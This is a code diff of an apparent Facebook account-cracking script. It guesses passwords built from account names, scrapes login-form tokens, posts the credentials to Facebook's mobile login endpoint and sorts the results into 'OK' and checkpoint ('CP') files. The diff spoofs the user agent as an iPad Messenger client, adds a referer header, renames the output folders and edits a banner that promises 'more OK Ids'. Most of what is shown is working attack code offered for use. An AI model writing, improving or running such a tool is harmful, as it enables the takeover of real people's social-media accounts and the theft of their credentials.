@@ -17,11 +17,11 @@ green = '\x1b[1;92m'
 white = '\x1b[1;97m'
 #_________[ CREATING CP/OK DIR ]_______>>
 try:
-	cmd("mkdir CP")
+	cmd("mkdir KING-CP")
 except:
 	pass
 try:
-	cmd("mkdir OK")
+	cmd("mkdir KING-OK")
 except:
 	pass
 #_________[ CRACKING HOST LIST ]_______>>
@@ -40,7 +40,7 @@ host_list = [
 fcp = "CP/CP-"+str(ltim()[2])+"-"+str(ltim()[1])+"-"+str(ltim()[0])+".txt"
 fok = "OK/OK-"+str(ltim()[2])+"-"+str(ltim()[1])+"-"+str(ltim()[0])+".txt"
 #_________[ LIST USERAGENT ]_____>>
-list_useragent = ["User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0"]
+list_useragent = ["User-Agent: Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]"]
 #_________[ EMPTY INT/LISTS ]_____>>
 ids = []
 pwd = []
@@ -72,11 +72,11 @@ def logo():
 {Y}888    Y88b 8888888  888    Y888   "Y8888P88 	
 {uu}					𝕌 𝕊 𝔸 𝕄 𝔸 
 \033[1;93m=================================
-\033[1;97m Owner  : US4M4 K19G :/
-\033[1;97m GitHub : US4M4-K19G :/
-\033[1;97m Version:\033[1;92m 0.1 \033[1;97m:/
+\033[1;97m Owner  : US4M4 K19G 
+\033[1;97m GitHub : US4M4-K19G 
+\033[1;97m Version:\033[1;92m 0.1 \033[1;97m
 \033[1;97m Status : Free :/
-\033[1;97m Notice : Use 10007/10006 For More OK Ids :/
+\033[1;97m Notice : Use 10007/10006 For More OK Ids 
 \033[1;93m=================================
 ''') 
 #_________[ FILE CRACK ]_______>>
@@ -161,7 +161,7 @@ def rcrack(uid,pwx,name,tl,host):
 			ps = ps.replace("fullname",fullname)
 			session = requests.Session()
 			pro = random.choice(list_useragent)
-			headers_ = {"Host":host,"upgrade-insecure-requests":"1","User-Agent": 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0',"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":hostx,"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
+			headers_ = {"Host":host,"upgrade-insecure-requests":"1","User-Agent": 'Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]',"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":hostx,"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			free_fb = session.get(f'https://{host}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',headers=headers_).text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
@@ -179,6 +179,7 @@ def rcrack(uid,pwx,name,tl,host):
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 			'accept-encoding':'utf-8',
 			'accept-language': 'en-US,en;q=0.9',
+			'referer': 'https://m.facebook.com/?paipv=0&eav=Afa_MmW_7sXVrhmH0PbRm71uQTpze0ysXQzhtbvaOAXPDqkOVNubHUw3nMg-ERe1hq8&_rdr',
 			'cache-control': 'max-age=0',
 			'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
 			'sec-ch-ua-mobile': '?0',
@@ -188,7 +189,7 @@ def rcrack(uid,pwx,name,tl,host):
 			'sec-fetch-site': 'none',
 			'sec-fetch-user': '?1',
 			'upgrade-insecure-requests': '1',
-			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',}
+			'user-agent': 'Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 Mozilla/5.0 (iPad; cpacc OS 10_1_1 like Mac OS X) AppleWebKit/602.2.14 (KHTML, like Gecko) Mobile/14B100 [FBAN/MessengerForiOS;FBAV/122.0.0.40.69;FBBV/61279955;FBDV/iPad4,1;FBMD/iPad;FBSN/iOS;FBSV/10.1.1;FBSS/2;FBCR/;FBID/tablet;FBLC/vi_VN;FBOP/5;FBRV/0]',}
 			lo = session.post(f'https://{host}/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text			
 			log_cookies=session.cookies.get_dict().keys()
 			#print(log_cookies)
